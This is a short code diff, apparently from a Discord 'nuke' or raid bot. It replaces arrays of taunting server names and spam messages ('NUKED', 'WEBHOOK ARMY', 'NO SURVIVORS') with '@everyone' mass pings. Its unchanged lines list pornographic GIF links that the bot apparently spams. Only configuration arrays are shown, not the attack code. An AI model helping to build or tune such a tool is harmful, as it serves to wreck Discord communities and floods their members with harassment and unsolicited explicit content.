@@ -77,10 +77,7 @@ const GIF_TYPE_1 = ['https://klipy.com/gifs/orgasm-cumming-1'];
 const GIF_TYPE_2 = ['https://klipy.com/gifs/vegan-porn-carrot-porn'];
 
 const SERVER_NAMES = [
-  'NUKED', 'SMART CHAOS', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
-  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
-  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
-  'NO ESCAPE', 'WEBHOOK ARMY', 'OVERPOWERED', 'VERY AGGRESSIVE'
+`@everyone`
 ];
 
 const CHANNEL_NAMES = [
@@ -102,10 +99,7 @@ const ROLE_NAMES = [
 ];
 
 const MESSAGES = [
-  '**SMART CHAOS**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
-  'OWNED', 'THE END', 'YOU CANNOT STOP THIS', 'BOT WINS',
-  'MINIONS ARE HELPING', 'ARMY INCOMING', 'FULL PRESSURE',
-  'PARALLEL DESTRUCTION', 'VERY AGGRESSIVE', 'SMART MODE'
+  `@everyone`
 ];
 
 const ARMY_NAMES = [
@@ -115,9 +109,7 @@ const ARMY_NAMES = [
 ];
 
 const ARMY_MESSAGES = [
-  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
-  'no survivors', 'gif spam', 'webhook army', 'we are many',
-  'collapse', 'smart chaos', 'very aggressive'
+  `@everyone`
 ];
 
 // ================== UTILS ==================
